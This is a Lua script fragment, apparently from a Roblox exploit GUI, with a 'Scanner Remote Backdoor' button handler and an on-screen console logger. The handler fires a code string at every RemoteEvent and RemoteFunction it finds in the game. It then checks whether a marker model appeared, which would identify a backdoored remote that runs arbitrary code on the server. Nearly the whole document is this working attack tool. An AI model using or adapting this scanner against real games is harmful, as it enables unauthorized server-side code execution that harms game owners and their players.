Scan.MouseButton1Click:Connect(function() 
    -- // Scanner Remote Backdoor
	if RemoteFound then return end
	RemoteFound = true
	ConsoleLog("[WARN] Scanning...", "warn")

	local RemoteList = {}
	RemoteName = nil
	Found = false

	for _, v in ipairs(game:GetDescendants()) do
		if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and not v:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
			table.insert(RemoteList, v)
		end
	end

	local function GenerateName(len)
		local s = ""
		for i = 1, len do
			s = s .. string.char(math.random(65, 90))
		end
		return s
	end

	coroutine.wrap(function()
		for _, Remote in ipairs(RemoteList) do
			if Found then break end
			local Name = GenerateName(12)
			local Code = 'Instance.new("Model", workspace).Name = "' .. Name .. '"'
			
			pcall(function()
				if Remote:IsA("RemoteEvent") then
					Remote:FireServer(Code)
				elseif Remote:IsA("RemoteFunction") then
					Remote:InvokeServer(Code)
				end
			end)

			task.wait(0.2)

			local m = workspace:FindFirstChild(Name)
			if m and m:IsA("Model") and not Found then
				Found = true
				RemoteName = Remote
				ConsoleLog("[WARN] Backdoor Found!", "warn")
				break
			end
		end

		task.delay(3, function()
			if not Found then
				ConsoleLog("[ERROR] Backdoor Not Found", "error")
			end
			RemoteFound = false
		end)
	end)()
end)

--// Console
local logLines = {}
local maxLines = 5

function ConsoleLog(text, logType)
	local color = "ffffff"
	if logType == "warn" then
		color = "ffc800"
	elseif logType == "error" then
		color = "ff5555"
	elseif logType == "info" then
		color = "55ff55"
	end

	table.insert(logLines, '<font color="#'..color..'">'..text..'</font>')

	if #logLines > maxLines then
		table.remove(logLines, 1)
	end

	Output.Text = table.concat(logLines, "<br/>")
end